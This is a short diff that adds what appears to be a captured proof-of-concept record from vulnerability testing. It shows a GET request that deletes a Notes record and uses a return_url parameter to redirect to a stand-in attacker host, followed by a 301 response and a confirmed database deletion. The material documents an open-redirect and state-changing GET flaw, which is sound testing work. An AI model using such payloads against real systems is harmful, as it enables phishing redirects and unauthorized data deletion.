@@ -1,0 +1,7 @@
+request: GET http://localhost:33116/index.php?module=Notes&action=Delete&record=ec1267f4-c9c1-4d0f-855c-998323c4ea6c&return_url=https://evil-cvehunter-c054_505001ad.example/pwn
+Referer: http://localhost:33116/index.php?module=Notes&action=DetailView&record=ec1267f4-c9c1-4d0f-855c-998323c4ea6c
+
+response status: 301
+Location: https://evil-cvehunter-c054_505001ad.example/pwn
+
+db side effect -- notes.deleted for ec1267f4-c9c1-4d0f-855c-998323c4ea6c: 1
